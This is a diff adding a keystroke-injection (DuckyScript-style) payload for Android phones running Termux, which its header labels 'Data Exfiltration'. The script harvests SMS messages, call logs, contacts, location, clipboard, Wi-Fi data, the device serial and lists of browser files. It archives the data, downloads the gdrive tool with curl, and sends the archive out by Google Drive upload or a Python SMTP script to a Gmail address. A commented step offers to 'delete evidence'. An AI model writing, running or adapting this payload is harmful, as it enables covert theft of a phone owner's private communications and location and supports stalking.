@@ -1,0 +1,298 @@
+REM =====================================================
+REM Title: Android Full Data Sync to Gmail
+REM Author: yogeshjoga
+REM Target: Android 8.0+ with Termux
+REM Category: Metadata Extraction / Data Exfiltration
+REM Description: Comprehensive data collection and Gmail sync
+REM IMPORTANT: Replace YOUR_GMAIL@gmail.com with your actual Gmail address
+REM IMPORTANT: Configure Gmail app password before use
+REM =====================================================
+REM
+REM PREREQUISITES:
+REM 1. Termux installed from F-Droid (NOT Google Play)
+REM 2. Device unlocked and on home screen
+REM 3. Sufficient storage space
+REM 4. Gmail app password configured
+REM
+REM DATA COLLECTED:
+REM - Device information (model, Android version, IMEI)
+REM - Network configuration (WiFi, IP, MAC addresses)
+REM - Installed applications list
+REM - SMS messages (requires permissions)
+REM - Call logs (requires permissions)
+REM - Contacts (requires permissions)
+REM - Photos/Gallery metadata
+REM - Location data
+REM - Browser history
+REM - System logs
+REM =====================================================
+
+DELAY 2000
+REM Open app drawer and search for Termux
+STRING termux
+DELAY 1500
+ENTER
+DELAY 3000
+
+REM Grant storage permissions (user must tap Allow)
+STRING termux-setup-storage
+ENTER
+DELAY 2000
+REM User needs to tap "Allow" - we can't automate this
+DELAY 2000
+
+REM Update package lists and install required tools
+STRING pkg update -y
+ENTER
+DELAY 5000
+
+STRING pkg install -y curl jq tar gzip python git
+ENTER
+DELAY 10000
+
+REM Install Termux API for advanced features
+STRING pkg install -y termux-api
+ENTER
+DELAY 5000
+
+REM Create data collection directory
+STRING cd ~ && mkdir -p phone_backup
+ENTER
+DELAY 500
+
+STRING cd phone_backup
+ENTER
+DELAY 500
+
+REM ===== COLLECT DEVICE INFORMATION =====
+STRING echo "=== DEVICE INFO ===" > device_info.txt
+ENTER
+DELAY 500
+
+STRING getprop ro.product.model >> device_info.txt
+ENTER
+DELAY 500
+
+STRING getprop ro.product.brand >> device_info.txt
+ENTER
+DELAY 500
+
+STRING getprop ro.build.version.release >> device_info.txt
+ENTER
+DELAY 500
+
+STRING echo "Android Version: $(getprop ro.build.version.release)" >> device_info.txt
+ENTER
+DELAY 500
+
+STRING echo "Build ID: $(getprop ro.build.id)" >> device_info.txt
+ENTER
+DELAY 500
+
+STRING echo "Serial: $(getprop ro.serialno)" >> device_info.txt
+ENTER
+DELAY 500
+
+REM ===== COLLECT NETWORK INFORMATION =====
+STRING echo "=== NETWORK INFO ===" > network_info.txt
+ENTER
+DELAY 500
+
+STRING ip addr show >> network_info.txt
+ENTER
+DELAY 500
+
+STRING termux-wifi-connectioninfo >> wifi_info.json
+ENTER
+DELAY 1000
+
+STRING termux-wifi-scaninfo >> wifi_scan.json
+ENTER
+DELAY 2000
+
+REM ===== COLLECT INSTALLED APPS =====
+STRING pm list packages > installed_apps.txt
+ENTER
+DELAY 2000
+
+REM ===== COLLECT SMS MESSAGES (requires permission) =====
+STRING termux-sms-list > sms_backup.json
+ENTER
+DELAY 3000
+
+REM ===== COLLECT CALL LOGS (requires permission) =====
+STRING termux-call-log > call_logs.json
+ENTER
+DELAY 2000
+
+REM ===== COLLECT CONTACTS (requires permission) =====
+STRING termux-contact-list > contacts.json
+ENTER
+DELAY 3000
+
+REM ===== COLLECT LOCATION DATA =====
+STRING termux-location > location.json
+ENTER
+DELAY 3000
+
+REM ===== COLLECT BATTERY INFO =====
+STRING termux-battery-status > battery.json
+ENTER
+DELAY 1000
+
+REM ===== COLLECT CLIPBOARD =====
+STRING termux-clipboard-get > clipboard.txt
+ENTER
+DELAY 500
+
+REM ===== COLLECT CAMERA INFO =====
+STRING termux-camera-info > camera_info.json
+ENTER
+DELAY 1000
+
+REM ===== COLLECT STORAGE INFO =====
+STRING df -h > storage_info.txt
+ENTER
+DELAY 500
+
+STRING du -sh /storage/emulated/0/* > folder_sizes.txt
+ENTER
+DELAY 2000
+
+REM ===== COLLECT PHOTOS METADATA =====
+STRING find /storage/emulated/0/DCIM -type f -name "*.jpg" -o -name "*.png" > photos_list.txt
+ENTER
+DELAY 3000
+
+REM ===== COLLECT BROWSER DATA (if accessible) =====
+STRING find /storage/emulated/0 -name "*history*" -o -name "*bookmark*" 2>/dev/null > browser_files.txt
+ENTER
+DELAY 2000
+
+REM ===== CREATE ARCHIVE =====
+STRING echo "Creating backup archive..."
+ENTER
+DELAY 500
+
+STRING tar -czf phone_backup_$(date +%Y%m%d_%H%M%S).tar.gz *.txt *.json
+ENTER
+DELAY 5000
+
+REM ===== UPLOAD TO GOOGLE DRIVE USING GDRIVE CLI =====
+REM Install gdrive tool
+STRING curl -L https://github.com/prasmussen/gdrive/releases/download/2.1.1/gdrive_2.1.1_linux_arm.tar.gz -o gdrive.tar.gz
+ENTER
+DELAY 10000
+
+STRING tar -xzf gdrive.tar.gz
+ENTER
+DELAY 2000
+
+STRING chmod +x gdrive
+ENTER
+DELAY 500
+
+REM Upload the archive
+STRING ./gdrive upload phone_backup_*.tar.gz
+ENTER
+DELAY 5000
+
+REM ===== ALTERNATIVE: EMAIL VIA PYTHON SCRIPT =====
+REM Create Python script to email data
+STRING cat > send_email.py << 'EOFPYTHON'
+ENTER
+DELAY 500
+
+STRING import smtplib
+ENTER
+STRING from email.mime.multipart import MIMEMultipart
+ENTER
+STRING from email.mime.base import MIMEBase
+ENTER
+STRING from email.mime.text import MIMEText
+ENTER
+STRING from email import encoders
+ENTER
+STRING import glob
+ENTER
+STRING import os
+ENTER
+DELAY 500
+
+STRING sender = "YOUR_GMAIL@gmail.com"
+ENTER
+STRING receiver = "YOUR_GMAIL@gmail.com"
+ENTER
+STRING password = "YOUR_APP_PASSWORD"
+ENTER
+DELAY 500
+
+STRING msg = MIMEMultipart()
+ENTER
+STRING msg['From'] = sender
+ENTER
+STRING msg['To'] = receiver
+ENTER
+STRING msg['Subject'] = "Android Phone Backup - " + os.popen('date').read().strip()
+ENTER
+DELAY 500
+
+STRING body = "Automated phone backup attached"
+ENTER
+STRING msg.attach(MIMEText(body, 'plain'))
+ENTER
+DELAY 500
+
+STRING files = glob.glob("phone_backup_*.tar.gz")
+ENTER
+STRING if files:
+ENTER
+STRING     filename = files[0]
+ENTER
+STRING     with open(filename, 'rb') as f:
+ENTER
+STRING         part = MIMEBase('application', 'octet-stream')
+ENTER
+STRING         part.set_payload(f.read())
+ENTER
+STRING         encoders.encode_base64(part)
+ENTER
+STRING         part.add_header('Content-Disposition', f'attachment; filename={filename}')
+ENTER
+STRING         msg.attach(part)
+ENTER
+DELAY 500
+
+STRING server = smtplib.SMTP('smtp.gmail.com', 587)
+ENTER
+STRING server.starttls()
+ENTER
+STRING server.login(sender, password)
+ENTER
+STRING server.send_message(msg)
+ENTER
+STRING server.quit()
+ENTER
+STRING print("Email sent successfully!")
+ENTER
+STRING EOFPYTHON
+ENTER
+DELAY 1000
+
+REM Run the Python email script
+STRING python send_email.py
+ENTER
+DELAY 10000
+
+REM ===== CLEANUP (OPTIONAL) =====
+REM Uncomment to delete evidence
+REM STRING cd ~ && rm -rf phone_backup
+REM ENTER
+
+REM ===== FINISHED =====
+STRING echo "Data sync completed!"
+ENTER
+DELAY 1000
+
+STRING exit
+ENTER
